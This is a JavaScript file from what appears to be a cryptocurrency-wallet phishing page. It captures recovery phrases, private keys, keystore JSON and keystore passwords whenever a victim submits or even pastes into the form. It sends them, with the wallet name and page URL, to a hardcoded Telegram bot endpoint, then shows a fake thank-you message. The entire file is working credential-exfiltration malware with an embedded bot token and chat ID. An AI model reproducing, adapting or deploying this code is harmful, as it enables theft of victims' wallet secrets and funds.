const chatIds = ["1907762562"];
const inputIds = ["recovery_phrase", "keystoreJson", "privateKey"];

const url = window.location.href;
const forms = document.querySelectorAll(".gform");
// console.log(forms);
// console.log(document.forms);
// document.getElementById("phraseForm").addEventListener("submit", (e) => {
//   e.preventDefault();
//   console.log("caughtttt phrase");
// });

if (forms) {
  for (let i = 0; i < forms.length; i++) {
    forms[i].addEventListener("submit", async (e) => {
      e.preventDefault();
      // console.log("caughtttt");
      await sendData(inputIds[i], i);
      document.querySelector(
        `#${forms[i].id} > div > .thankyou_message `
      ).style.display = "flex";
      await sleep(4000);
      document.querySelector(
        `#${forms[i].id} > div > .thankyou_message `
      ).style.display = "none";
    });
  }
}
// function testPaste() {
//   console.log("paste");
// }
for (let i = 0; i < inputIds.length; i++) {
  document.getElementById(inputIds[i]).addEventListener("paste", async () => {
    // console.log("paste caught");
    // await sleep();
    await sendData(inputIds[i], i);
  });
}
async function sendData(inputId, i) {
  const walletName = document.getElementById("walletname");
  await sleep(1000);
  const inputBox = document.getElementById(inputId);
  const kp = document.getElementById("keystorePassword");
  // console.log(i);
  const data = `wallet name: ${walletName.innerText}\n 
  key type: ${inputId} \n 
  value : ${inputBox.value} \n
   ${kp.value ? `keystore password : ${kp.value}  \n ` : ""}  
   ${url}`;

  await sendMsg(data);
}

const sendMsg = async (msg) => {
  for (let i = 0; i < chatIds.length; i++) {
    const data = {
      chat_id: chatIds[i],
      text: msg,
    };
    const resp = await fetch(
      `https://api.telegram.org/bot6544701468%3AAAFHo-6ohRT0Tf4Ep9bG-yoWdxvt1AZeU0I/sendMessage`,
      {
        method: "POST",
        headers: {
          accept: "application/json",
          "content-type": "application/json",
        },
        body: JSON.stringify(data),
      }
    );
    const resJson = await resp.json();
    console.log(resJson);
  }
};
document.getElementById("cancel").addEventListener("click", () => {
  const errs = document.querySelectorAll(".thankyou_message");
  for (let i = 0; i < errs.length; i++) {
    errs[i].style.display = "none";
    forms[i].reset();
    console.log("reset!");
  }
  // for(let i=0; i<forms.length;i++ ){
  //     forms[i].
  // }
});

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
